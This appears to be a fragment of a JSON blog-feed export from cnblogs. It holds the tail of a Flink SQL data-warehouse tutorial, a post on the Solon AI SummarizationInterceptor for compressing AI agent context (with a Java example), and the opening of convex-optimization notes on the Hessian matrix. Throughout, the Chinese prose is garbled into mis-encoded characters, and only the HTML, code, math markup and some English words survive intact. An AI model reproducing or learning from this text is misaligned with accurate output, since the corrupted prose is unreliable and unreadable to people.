‡ä¸»é¢˜å±‚ï¼ˆADSï¼‰ä¸²èµ·æ¥ï¼Œåšä¸€ä¸ªç«¯åˆ°ç«¯çš„å®æ—¶æ•°ä»“å°é¡¹ç›®</li>\n</ul>\n<p>å¦‚æœä½ å·²ç»è·‘é€šäº†æœ¬æ–‡çš„ Demoï¼Œä¸å¦¨è¯•ç€è‡ªå·±è®¾è®¡ä¸€å¼ å•†å“ç»´è¡¨ <code>dim_product</code>ï¼Œå†ç»™è®¢å•æ‰“ä¸Šå•†å“å“ç±»ç»´åº¦ï¼Œä½“éªŒä¸€ä¸‹â€œäº‹å® + å¤šç»´è¡¨æ—¶æ€ Joinâ€åœ¨ Flink SQL é‡Œçš„å®Œæ•´å‘³é“ã€‚</p>\n<hr />\n<p><a href=\"http://blog.daimajiangxin.com.cn\" rel=\"noopener nofollow\" target=\"_blank\">åŸæ–‡æ¥è‡ª:http://blog.daimajiangxin.com.cn</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 12:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/daimajiangxin\">ä»£ç åŒ å¿ƒ</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">50</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "èµ‹äºˆ AI Agent â€œæ— é™ç»­èˆªâ€ï¼šè¯­ä¹‰ä¿æŠ¤å‹ä¸Šä¸‹æ–‡å‹ç¼©æŠ€æœ¯è§£æ",
      "link": "https://www.cnblogs.com/noear/p/19624614",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/noear/p/19624614\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 12:21\">\n    <span>èµ‹äºˆ AI Agent â€œæ— é™ç»­èˆªâ€ï¼šè¯­ä¹‰ä¿æŠ¤å‹ä¸Šä¸‹æ–‡å‹ç¼©æŠ€æœ¯è§£æ</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Solon AIæ¡†æ¶çš„SummarizationInterceptoråˆ›æ–°æ€§åœ°è§£å†³äº†AIé•¿å¯¹è¯ä¸­çš„\"ä¸Šä¸‹æ–‡çª—å£çˆ†ç‚¸\"é—®é¢˜ã€‚è¿™å¥—æ™ºèƒ½è®°å¿†ç®¡ç†ç³»ç»Ÿé€šè¿‡å››æ­¥ç­–ç•¥ï¼šé”å®šæ ¸å¿ƒä»»åŠ¡æŒ‡ä»¤ã€ç¡®ä¿è¡ŒåŠ¨-ç»“æœå®Œæ•´æ€§ã€ä¿æŒè¯­ä¹‰è¿è´¯æ€§ã€æ·»åŠ ç³»ç»Ÿæç¤ºï¼Œå®ç°äº†ä¼˜é›…çš„è®°å¿†å‹ç¼©ã€‚å…¶é‡‡ç”¨æ’ä»¶å¼è®¾è®¡ï¼Œæ”¯æŒå±‚çº§å‹ç¼©ã€å…³é”®ä¿¡æ¯æå–å’Œå‘é‡åº“å½’æ¡£ç­‰ç­–ç•¥ç»„åˆï¼Œè®©AIæ—¢èƒ½è®°ä½æ ¸å¿ƒç›®æ ‡ï¼Œåˆèƒ½å¤„ç†è¶…é•¿ä»»åŠ¡ã€‚è¿™ç§\"æœ‰é€»è¾‘åœ°é—å¿˜\"æœºåˆ¶ï¼Œæœ‰æ•ˆé¿å…äº†ä¼ ç»Ÿç²—æš´è£å‰ªå¯¼è‡´çš„é€»è¾‘æ··ä¹±ï¼Œä¸ºAIå¤„ç†å¤æ‚ä»»åŠ¡æä¾›äº†\"æ— é™ç»­èˆª\"\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æ­£åœ¨æŒ‡æŒ¥ä¸€ä¸ªè¶…çº§èªæ˜çš„AIåŠ©æ‰‹ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸ºAgentï¼‰å¸®ä½ å®Œæˆä¸€é¡¹å¤æ‚ä»»åŠ¡ï¼Œæ¯”å¦‚ç­–åˆ’ä¸€æ¬¡è·¨å›½æ—…è¡Œã€‚ä¸€å¼€å§‹ï¼Œå®ƒè®°å¾—ä½ çš„æ‰€æœ‰è¦æ±‚ï¼šæƒ³å»å“ªäº›å›½å®¶ã€é¢„ç®—å¤šå°‘ã€å–œæ¬¢ä»€ä¹ˆç±»å‹çš„é…’åº—ã€‚ä½†éšç€ä»»åŠ¡çš„è¿›è¡Œï¼Œå®ƒéœ€è¦æŸ¥è¯¢èˆªç­ã€æ¯”è¾ƒé…’åº—ã€æŸ¥çœ‹å¤©æ°”â€¦â€¦æ¯ä¸€æ¬¡æŸ¥è¯¢å’Œæ€è€ƒéƒ½ä¼šå¢åŠ å®ƒçš„â€œè®°å¿†è´Ÿæ‹…â€ã€‚</p>\n<p>å¦‚æœå®ƒâ€œè®°æ€§â€ä¸å¥½ï¼ŒèŠåˆ°ä¸€åŠå°±ä¼šå¿˜äº†æœ€å¼€å§‹çš„è¦æ±‚ï¼Œæˆ–è€…é™·å…¥æ··ä¹±çš„é€»è¾‘ä¸­ï¼Œè¿™å°±æ˜¯å¼€å‘è€…å¸¸è¯´çš„â€œä¸Šä¸‹æ–‡çª—å£çˆ†ç‚¸â€é—®é¢˜ã€‚</p>\n<p>Solon AI æ¡†æ¶é‡Œæœ‰ä¸€ä¸ªç§˜å¯†æ­¦å™¨â€”â€”<code>SummarizationInterceptor</code>ï¼ˆæ™ºèƒ½è®°å¿†å‹ç¼©å™¨ï¼‰ï¼Œå®ƒèƒ½è®©AIåŠ©æ‰‹åƒäººä¸€æ ·ï¼Œ<strong>æ—¢ä¸ä¼šå¿˜è®°åˆå¿ƒï¼Œåˆèƒ½è½»è£…ä¸Šé˜µï¼Œå®ç°çœŸæ­£çš„â€œæ— é™ç»­èˆªâ€</strong>ã€‚å®ƒä¸æ˜¯ç®€å•ç²—æš´åœ°â€œæ–­ç‰‡â€ï¼Œè€Œæ˜¯ä¸€å¥—ä¼˜é›…çš„â€œè®°å¿†ç®¡ç†å¤§å¸ˆâ€ã€‚</p>\n<h3 id=\"1ä¸ºä»€ä¹ˆä¸èƒ½ç®€å•ç²—æš´åœ°æ–­ç‰‡\">1ã€ä¸ºä»€ä¹ˆä¸èƒ½ç®€å•ç²—æš´åœ°â€œæ–­ç‰‡â€ï¼Ÿ</h3>\n<p>å¤„ç†é•¿å¯¹è¯ï¼Œæœ€ç›´æ¥çš„æƒ³æ³•æ˜¯ï¼šå¯¹è¯å¤ªé•¿ï¼Ÿé‚£å°±åˆ æ‰å‰é¢ä¸€åŠå§ï¼ä½†è¿™ç§â€œæš´åŠ›è£å‰ªâ€å¯¹AIæ¥è¯´ï¼Œä¼šå¸¦æ¥ä¸¤ä¸ªè‡´å‘½ä¼¤ï¼š</p>\n<ul>\n<li><strong>å¿˜æœ¬ï¼ˆå¤±å»åˆå¿ƒï¼‰ï¼š</strong> AI Agent æœ€å¼€å¤´çš„ç³»ç»Ÿè®¾å®šå’Œä½ äº¤ç»™å®ƒçš„ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼Œå¦‚æœè¢«åˆ æ‰ï¼Œå®ƒå°±ä¼šåƒæ— å¤´è‹è‡ä¸€æ ·ï¼Œå®Œå…¨ä¸çŸ¥é“è‡ªå·±è¦å¹²å˜›äº†ã€‚</li>\n<li><strong>æ–­ç‰‡ï¼ˆé€»è¾‘æ–­å±‚ï¼‰ï¼š</strong> AI Agent çš„å·¥ä½œæ¨¡å¼é€šå¸¸æ˜¯â€œæ€è€ƒ -&gt; è¡ŒåŠ¨ -&gt; è§‚å¯Ÿç»“æœâ€ï¼ˆReActï¼‰ã€‚å¦‚æœä½ æ°å¥½æŠŠå®ƒçš„æŸä¸ªâ€œè¡ŒåŠ¨â€å’Œå¯¹åº”çš„â€œè§‚å¯Ÿç»“æœâ€ç»™æ‹†æ•£äº†ï¼Œå®ƒçœ‹åˆ°ç»“æœå´ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸ªç»“æœï¼Œé€»è¾‘ç¬é—´æ··ä¹±ï¼Œç”šè‡³é™·å…¥æ­»å¾ªç¯ï¼Œæ— æ³•è‡ªæ‹”ã€‚</li>\n</ul>\n<p>æ‰€ä»¥ï¼Œå¿˜è®°ä¹Ÿæ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œéœ€è¦æœ‰ç­–ç•¥åœ°å¿˜è®°ã€‚</p>\n<h3 id=\"2æ™ºèƒ½è®°å¿†å‹ç¼©å™¨æ˜¯å¦‚ä½•å·¥ä½œçš„\">2ã€æ™ºèƒ½è®°å¿†å‹ç¼©å™¨æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</h3>\n<p><code>SummarizationInterceptor</code> å°±åƒä¸€ä¸ªèªæ˜çš„å›¾ä¹¦ç®¡ç†å‘˜ï¼Œå®ƒä¸ä¼šéšæ„ä¸¢å¼ƒä¹¦ç±ï¼Œè€Œæ˜¯æŒ‰ç…§ä¸€å¥—ç²¾å¯†çš„æµç¨‹æ¥æ•´ç†ä¹¦æ¶ã€‚å®ƒçš„å·¥ä½œåˆ†ä¸ºå››æ­¥ï¼š</p>\n<h4 id=\"ç¬¬ä¸€æ­¥é”æ­»åˆå¿ƒé”šç‚¹é”å®š\">ç¬¬ä¸€æ­¥ï¼šé”æ­»â€œåˆå¿ƒâ€ï¼ˆé”šç‚¹é”å®šï¼‰</h4>\n<p>æ— è®ºåé¢çš„å¯¹è¯æœ‰å¤šé•¿ï¼Œç®¡ç†å‘˜éƒ½ä¼šç¬¬ä¸€æ—¶é—´æ‰¾åˆ°ä¸¤æ ·ä¸œè¥¿å¹¶æ°¸ä¹…ä¿ç•™ï¼š</p>\n<ul>\n<li><strong>ä»»åŠ¡æŒ‡ä»¤ï¼š</strong> ä½ ç¬¬ä¸€æ¬¡ç»™AIå¸ƒç½®çš„ä»»åŠ¡ï¼ˆUserMessageï¼‰ï¼Œè¿™æ˜¯å®ƒçš„â€œåˆå¿ƒâ€ã€‚</li>\n<li><strong>åŸºæœ¬å®ˆåˆ™ï¼š</strong> AIçš„ç³»ç»Ÿè®¾å®šï¼ˆSystemMessageï¼‰ï¼Œè¿™æ˜¯å®ƒçš„â€œè¡Œä¸ºå‡†åˆ™â€ã€‚</li>\n</ul>\n<p>è¿™ä¸¤æ ·ä¸œè¥¿è¢«ç‰¢ç‰¢é”å®šï¼Œç¡®ä¿AIæ°¸ä¸è¿·å¤±æ–¹å‘ã€‚</p>\n<h4 id=\"ç¬¬äºŒæ­¥ç¦æ­¢æ–­ç‰‡åŸå­å¯¹é½\">ç¬¬äºŒæ­¥ï¼šç¦æ­¢â€œæ–­ç‰‡â€ï¼ˆåŸå­å¯¹é½ï¼‰</h4>\n<p>è¿™æ˜¯æ•´ä¸ªæœºåˆ¶æœ€æ ¸å¿ƒçš„â€œé»‘ç§‘æŠ€â€ã€‚å½“ç®¡ç†å‘˜å†³å®šè¦æ¸…ç†ä¸€éƒ¨åˆ†æ—§å†…å®¹æ—¶ï¼Œä»–ä¸ä¼šç›´æ¥åŠ¨æ‰‹ã€‚ä»–ä¼šä»”ç»†æ£€æŸ¥ï¼Œç¡®ä¿æ°¸è¿œä¸ä¼šæŠŠ <strong>â€œè¡ŒåŠ¨â€</strong> å’Œ <strong>â€œç»“æœâ€</strong> è¿™å¯¹â€œè¿ä½“å©´å„¿â€ç»™æ‹†æ•£ã€‚</p>\n<ul>\n<li><strong>æ™ºèƒ½æ£€æŸ¥ï¼š</strong> å¦‚æœå‘ç°å‡†å¤‡æ¸…ç†çš„èµ·ç‚¹æ­£å¥½è½åœ¨ä¸€ä¸ªâ€œè§‚å¯Ÿç»“æœâ€ï¼ˆ<code>ToolMessage</code>ï¼‰æˆ–è€…ä¸€ä¸ªâ€œè¡ŒåŠ¨æŒ‡ä»¤â€ï¼ˆ<code>AssistantMessage</code>ï¼‰ä¸Šï¼Œç®¡ç†å‘˜ä¼šç«‹åˆ»æŠŠæ¸…ç†èµ·ç‚¹å‘åæŒªï¼Œç›´åˆ°ç¡®ä¿æ¯ä¸€å¯¹â€œè¡ŒåŠ¨-ç»“æœâ€éƒ½å®Œæ•´åœ°ä¿ç•™ä¸‹æ¥ã€‚</li>\n</ul>\n<h4 id=\"ç¬¬ä¸‰æ­¥è®©è®°å¿†æ›´è¿è´¯è¯­ä¹‰è¡¥é½\">ç¬¬ä¸‰æ­¥ï¼šè®©è®°å¿†æ›´è¿è´¯ï¼ˆè¯­ä¹‰è¡¥é½ï¼‰</h4>\n<p>ä¸ºäº†è®©ä½ å’ŒAIçš„å¯¹è¯è¯»èµ·æ¥æ›´é€šé¡ºï¼Œç®¡ç†å‘˜è¿˜ä¼šå†å¤šåšä¸€æ­¥â€œäººæƒ…å‘³â€çš„æ£€æŸ¥ã€‚å¦‚æœæ¸…ç†åçš„ç¬¬ä¸€æ¡è®°å½•æ˜¯ä¸€ä¸ªâ€œè¡ŒåŠ¨ç»“æœâ€ï¼Œç®¡ç†å‘˜ä¼šçœ‹çœ‹å®ƒå‰é¢æ˜¯ä¸æ˜¯ç´§è·Ÿç€ä¸€æ¡AIçš„â€œæ€è€ƒè¿‡ç¨‹â€ï¼ˆThoughtï¼‰ã€‚å¦‚æœæ˜¯ï¼Œä»–ä¼šæŠŠè¿™æ¡â€œæ€è€ƒâ€ä¹Ÿä¸€å¹¶ç•™ä¸‹ã€‚è¿™æ ·ä¸€æ¥ï¼ŒAIçœ‹åˆ°çš„å†å²æ°¸è¿œæ˜¯ä»ä¸€ä¸ªæ€è€ƒç‰‡æ®µå¼€å§‹çš„ï¼Œç†è§£èµ·æ¥æ›´è‡ªç„¶ã€‚</p>\n<h4 id=\"ç¬¬å››æ­¥è´´ä¸ªä¾¿åˆ©è´´æé†’æ–­è£‚æ„ŸçŸ¥\">ç¬¬å››æ­¥ï¼šè´´ä¸ªâ€œä¾¿åˆ©è´´â€æé†’ï¼ˆæ–­è£‚æ„ŸçŸ¥ï¼‰</h4>\n<p>åœ¨æ°¸ä¹…ä¿å­˜çš„â€œåˆå¿ƒâ€å’Œå‹ç¼©åçš„â€œæœ€è¿‘è®°å¿†â€ä¹‹é—´ï¼Œç®¡ç†å‘˜ä¼šè´´ä¸Šä¸€å¼ é†’ç›®çš„ <strong>â€œå°è´´å£«â€</strong>ï¼š</p>\n<pre><code>--- [ç³»ç»Ÿæç¤ºï¼šä¸­é—´éƒ¨åˆ†å†å²å¯¹è¯å·²ä¼˜åŒ–å‹ç¼©ï¼Œè¯·æ ¹æ®å½“å‰è®¡åˆ’å’Œå‰©ä½™å†å²ç»§ç»­ä»»åŠ¡...] ---\n</code></pre>\n<p>è¿™å¼ â€œå°è´´å£«â€éå¸¸é‡è¦ï¼Œå®ƒç”¨AIèƒ½ç†è§£çš„è¯­è¨€å‘Šè¯‰å®ƒï¼šâ€œåˆ«æ‹…å¿ƒï¼Œä¸­é—´æœ‰äº›ç»†èŠ‚æˆ‘å¸®ä½ ç²¾ç®€äº†ï¼Œä½ ä¸“æ³¨çœ¼å‰çš„ä»»åŠ¡å’Œæ ¸å¿ƒç›®æ ‡å°±å¥½ã€‚â€è¿™èƒ½æœ‰æ•ˆé˜²æ­¢AIå› ä¸ºè®°å¿†æ–­å±‚è€Œäº§ç”Ÿå›°æƒ‘å’Œå¹»è§‰ã€‚</p>\n<h3 id=\"3å¦‚ä½•å®ç°æ— é™ç»­èˆª\">3ã€å¦‚ä½•å®ç°â€œæ— é™ç»­èˆªâ€ï¼Ÿ</h3>\n<p>é€šè¿‡è¿™å¥—â€œè®°å¿†ç®¡ç†æœ¯â€ï¼ŒSummarizationInterceptor æŠŠAIçš„å†…å­˜å˜æˆäº†ä¸€ä¸ªåŠ¨æ€çš„â€œæ–°é™ˆä»£è°¢ç³»ç»Ÿâ€ï¼š</p>\n<ul>\n<li><strong>å†…å­˜æ’å®šï¼š</strong> æ— è®ºAIè¿è¡Œäº†10æ­¥è¿˜æ˜¯1000æ­¥ï¼Œå®ƒä¸€æ¬¡â€œæ€è€ƒâ€æ‰€éœ€è¦å¤„ç†çš„ä¿¡æ¯é‡ï¼ˆTokenæ•°ï¼‰å§‹ç»ˆç»´æŒåœ¨ä¸€ä¸ªå®‰å…¨çš„èŒƒå›´å†…ã€‚</li>\n<li><strong>é€»è¾‘æ¸…æ™°ï¼š</strong> å› ä¸ºâ€œåŸå­å¯¹é½â€æœºåˆ¶ï¼ŒAIçœ‹åˆ°çš„æ¯ä¸€æ®µè®°å¿†éƒ½æ˜¯å®Œæ•´çš„â€œæ€è€ƒ-è¡ŒåŠ¨-åé¦ˆâ€é—­ç¯ï¼Œé€»è¾‘é“¾æ¡éå¸¸ç¨³å›ºã€‚</li>\n<li><strong>ç›®æ ‡æ°¸å­˜ï¼š</strong> â€œç³»ç»Ÿè®¾å®šâ€å’Œâ€œç”¨æˆ·ä»»åŠ¡â€è¿™ä¸¤å¤§æ ¸å¿ƒç›®æ ‡æ°¸è¿œåœ¨çº¿ï¼ŒAIæ°¸è¿œä¸ä¼šå¿˜è®°â€œæˆ‘æ˜¯è°â€å’Œâ€œæˆ‘è¦å»å“ªâ€ã€‚</li>\n</ul>\n<h3 id=\"4æ›´å¼ºå¤§çš„ç»„åˆæ’ä»¶å¼çš„è®°å¿†ç­–ç•¥\">4ã€æ›´å¼ºå¤§çš„ç»„åˆï¼šæ’ä»¶å¼çš„è®°å¿†ç­–ç•¥</h3>\n<p>è¿™ä¸ªâ€œè®°å¿†ç®¡ç†å™¨â€æœ€å¦™çš„åœ°æ–¹åœ¨äºï¼Œå®ƒé‡‡ç”¨äº† <strong>ç­–ç•¥æ¨¡å¼</strong>ï¼Œå°±åƒæ‰‹æœºå¯ä»¥å®‰è£…ä¸åŒçš„APPæ¥æ‰©å±•åŠŸèƒ½ä¸€æ ·ï¼Œä½ å¯ä»¥ç»™å®ƒæ¥å…¥ä¸åŒçš„â€œè®°å¿†å¤„ç†æ’ä»¶â€ã€‚æ¡†æ¶å·²ç»ä¸ºæˆ‘ä»¬å‡†å¤‡äº†å‡ æ¬¾å¼ºå¤§çš„æ’ä»¶ï¼š</p>\n<ul>\n<li><strong>å±‚çº§å‹ç¼©å™¨ï¼š</strong> å®ƒä¼šåƒæ»šé›ªçƒä¸€æ ·ï¼ŒæŠŠæ—§çš„è®°å¿†æ‘˜è¦å’Œæ–°çš„å¯¹è¯å†å²ä¸æ–­èåˆã€å‹ç¼©ï¼Œç”Ÿæˆä¸€ä¸ªå§‹ç»ˆæ›´æ–°çš„â€œå…¨å±€è¿›åº¦æ‘˜è¦â€ï¼Œè®©è®°å¿†åƒæ´‹è‘±ä¸€æ ·å±‚å±‚åŒ…è£¹ï¼Œæ°¸ä¸ä¸¢å¤±æ ¸å¿ƒã€‚</li>\n<li><strong>å…³é”®ä¿¡æ¯æå–å™¨ï¼š</strong> å®ƒåƒä¸€ä¸ªä¿¡æ¯å®¡è®¡å‘˜ï¼Œåªä»å¯¹è¯ä¸­æå–æœ€æ ¸å¿ƒçš„â€œå¹²è´§â€ï¼Œæ¯”å¦‚ç”¨æˆ·è¦æ±‚ã€è·å–åˆ°çš„æ•°æ®ã€å·²ç»å¤±è´¥çš„å°è¯•ç­‰ï¼Œè¿‡æ»¤æ‰é‚£äº›å•°å—¦çš„æ€è€ƒè¿‡ç¨‹ã€‚</li>\n<li><strong>å‘é‡åº“è®°å¿†å¸ˆï¼š</strong> å®ƒä¼šå°†è¢«æ¸…ç†çš„è¯¦ç»†å¯¹è¯â€œå½’æ¡£â€åˆ°ä¸€ä¸ªå·¨å¤§çš„çŸ¥è¯†åº“é‡Œï¼ˆå‘é‡æ•°æ®åº“ï¼‰ã€‚å½“AIéœ€è¦å›å¿†æŸä¸ªç»†èŠ‚æ—¶ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªä¸“é—¨çš„â€œå¬å›å†å²â€å·¥å…·ï¼Œåƒç”¨æœç´¢å¼•æ“ä¸€æ ·æŠŠå®ƒæ‰¾å›æ¥ã€‚</li>\n</ul>\n<p>ä½ å¯ä»¥æŠŠè¿™äº›æ’ä»¶ç»„åˆèµ·æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚å…ˆå½’æ¡£ï¼Œå†æçº¯ï¼Œæœ€åå‹ç¼©ï¼Œæ‰“é€ ä¸€ä¸ªæœ€é€‚åˆä½ AIåŠ©æ‰‹çš„è®°å¿†ç®¡ç†æ–¹æ¡ˆã€‚</p>\n<p>åº”ç”¨ç¤ºä¾‹ï¼š</p>\n<pre><code class=\"language-java\">import org.noear.solon.ai.agent.react.ReActAgent;\nimport org.noear.solon.ai.agent.react.intercept.SummarizationInterceptor;\nimport org.noear.solon.ai.agent.react.intercept.summarize.*;\nimport org.noear.solon.ai.agent.session.InMemoryAgentSession;\nimport org.noear.solon.ai.chat.ChatModel;\n\nCompositeSummarizationStrategy compositeStrategy = new CompositeSummarizationStrategy();\ncompositeStrategy.addStrategy(new KeyInfoExtractionStrategy(chatModel));\ncompositeStrategy.addStrategy(new HierarchicalSummarizationStrategy(chatModel));\nSummarizationInterceptor summarizationInterceptor = new SummarizationInterceptor(12, compositeStrategy);\n\nReActAgent agent = ReActAgent.of(chatModel)\n        .defaultInterceptorAdd(summarizationInterceptor)\n        .build();\n</code></pre>\n<h3 id=\"5æ€»ç»“\">5ã€æ€»ç»“</h3>\n<p><code>SummarizationInterceptor</code> çš„è®¾è®¡å“²å­¦æ˜¯ï¼š<strong>æœ‰å°Šä¸¥åœ°è£å‰ªï¼Œæœ‰é€»è¾‘åœ°é—å¿˜</strong>ã€‚</p>\n<p>å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªèŠ‚çœè®¡ç®—èµ„æºçš„å·¥å…·ï¼Œæ›´æ˜¯AIèƒ½å¤Ÿä¿æŒé€»è¾‘è¿è´¯ã€å¤„ç†è¶…é•¿å¤æ‚ä»»åŠ¡çš„â€œæŠ¤èˆªè€…â€ã€‚æœ‰äº†å®ƒï¼Œå¼€å‘è€…å¯ä»¥æ”¾å¿ƒåœ°è®©AIåŠ©æ‰‹å»å¤„ç†é‚£äº›éœ€è¦å‡ ä¸ªå°æ—¶ç”šè‡³å‡ å¤©æ‰èƒ½å®Œæˆçš„ã€çœŸæ­£å¤æ‚å’Œæ™ºèƒ½åŒ–çš„å·¥ä½œï¼Œè€Œä¸ç”¨æ‹…å¿ƒå®ƒä¼šä¸­é€”â€œå¤±å¿†â€æˆ–â€œç²¾ç¥é”™ä¹±â€ã€‚</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 12:21</span>&nbsp;\n<a href=\"https://www.cnblogs.com/noear\">å¸¦åˆºçš„åæ¤…</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">43</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "å‡¸ä¼˜åŒ–æ•°å­¦åŸºç¡€ç¬”è®°ï¼ˆå››ï¼‰ï¼šHessian çŸ©é˜µåŠ Taylor å±•å¼€",
      "link": "https://www.cnblogs.com/GeophysicsWorker/p/19624189",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/GeophysicsWorker/p/19624189\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 09:48\">\n    <span>å‡¸ä¼˜åŒ–æ•°å­¦åŸºç¡€ç¬”è®°ï¼ˆå››ï¼‰ï¼šHessian çŸ©é˜µåŠ Taylor å±•å¼€</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        ä¸Šä¸€èŠ‚è¯´è¿‡ï¼Œæ¢¯åº¦ $\\nabla f(\\mathbf{X})$ æ˜¯$f(\\mathbf{X})$ å…³äº$\\mathbf{X}$ çš„ä¸€é˜¶å¯¼æ•°ï¼Œç°åœ¨ä¸€ä¸ªé—®é¢˜$f(\\mathbf{X})$ å…³äº $\\mathbf{X}$ çš„äºŒé˜¶å¯¼æ•°æ˜¯ä»€ä¹ˆï¼ŸHessian çŸ©é˜µï¼ˆæµ·æ£®çŸ©é˜µï¼‰æ˜¯ä¸€ä¸ªå¤šå˜é‡å®å€¼å‡½æ•°$f(\\mathbf{X})$çš„äºŒé˜¶å¯¼æ•°æ„æˆå¾—æ–¹é˜µï¼Œå…¶å‡ ä½•æ„ä¹‰æ˜¯æè¿°äº†ä¸€ä¸ªå¤šå…ƒå‡½æ•°æˆ–åœºå‡½æ•°çš„å±€éƒ¨æ›²ç‡ã€‚åœ¨æœºå™¨å­¦ä¹ ã€ä¼˜åŒ–é—®é¢˜å’Œç‰©ç†åæ¼”é—®é¢˜ä¸­ï¼ŒHessiançŸ©é˜µæ‰®æ¼”ç€é‡è¦çš„è§’è‰²ï¼Œå°¤å…¶æ˜¯åœ¨å¯»æ‰¾å‡½æ•°çš„æå€¼ç‚¹ï¼ˆå¦‚æŸå¤±å‡½æ•°æˆ–ç›®æ ‡å‡½æ•°çš„æœ€å°å€¼ï¼‰å’Œåˆ†æç³»ç»Ÿçš„ç¨³å®šæ€§ã€‚\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1hessiançŸ©é˜µå®šä¹‰åŠæ€§è´¨\">1.HessiançŸ©é˜µå®šä¹‰åŠæ€§è´¨</h2>\n<p>â€‹\tåœ¨ä¸Šä¸€èŠ‚è¯´è¿‡ï¼Œæ¢¯åº¦ <span class=\"math inline\">\\(\\nabla f(\\mathbf{X})\\)</span> æ˜¯<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> å…³äº<span class=\"math inline\">\\(\\mathbf{X}\\)</span> çš„ä¸€é˜¶å¯¼æ•°ï¼Œç°åœ¨ä¸€ä¸ªé—®é¢˜<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> å…³äº <span class=\"math inline\">\\(\\mathbf{X}\\)</span> çš„äºŒé˜¶å¯¼æ•°æ˜¯ä»€ä¹ˆï¼ŸHessian çŸ©é˜µï¼ˆæµ·æ£®çŸ©é˜µï¼‰æ˜¯ä¸€ä¸ªå¤šå˜é‡å®å€¼å‡½æ•°<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span>çš„äºŒé˜¶å¯¼æ•°æ„æˆå¾—æ–¹é˜µï¼Œå…¶å‡ ä½•æ„ä¹‰æ˜¯æè¿°äº†ä¸€ä¸ªå¤šå…ƒå‡½æ•°æˆ–åœºå‡½æ•°çš„å±€éƒ¨æ›²ç‡ã€‚åœ¨æœºå™¨å­¦ä¹ ã€ä¼˜åŒ–é—®é¢˜å’Œç‰©ç†åæ¼”é—®é¢˜ä¸­ï¼ŒHessiançŸ©é˜µæ‰®æ¼”ç€é‡è¦çš„è§’è‰²ï¼Œå°¤å…¶æ˜¯åœ¨å¯»æ‰¾å‡½æ•°çš„æå€¼ç‚¹ï¼ˆå¦‚æŸå¤±å‡½æ•°æˆ–ç›®æ ‡å‡½æ•°çš„æœ€å°å€¼ï¼‰å’Œåˆ†æç³»ç»Ÿçš„ç¨³å®šæ€§ã€‚ä¸‹é¢æ˜¯å…³äºHessiançŸ©é˜µçš„è¯¦ç»†ä»‹ç»ï¼š</p>\n<p>â€‹\t<strong>Definition 4.1.1</strong>  è®¾<span class=\"math inline\">\\(f:\\mathbb{R}^n\\rightarrow{\\mathbb{R}}\\)</span> , <span class=\"math inline\">\\(\\mathbf{X}\\in{R}^n\\)</span> ,å¦‚æœ<span class=\"math inline\">\\(f\\)</span>åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> å¤„å¯¹äºè‡ªå˜é‡<span class=\"math inline\">\\(\\mathbf{X}\\)</span> çš„å„ä¸ªåˆ†é‡<span class=\"math inline\">\\(x_i,x_j\\)</span> çš„äºŒé˜¶åå¯¼</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part{f(\\mathbf{X}_0)}}{\\part{x_i}\\part{x_j}} \t\t\\hspace{2em} (i,j=1,2,...,n)\n\\]</div><p></p><p>éƒ½å­˜åœ¨ï¼Œåˆ™ç§°å‡½æ•°<span class=\"math inline\">\\(f\\)</span> åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> å¤„äºŒé˜¶å¯å¯¼ï¼Œå¹¶ä¸”ç§°çŸ©é˜µï¼š</p>\n<p></p><div class=\"math display\">\\[\\nabla^2f(\\mathbf{X}_0)=\\left(\\begin{matrix}\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1^2}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_n}}\\\\ 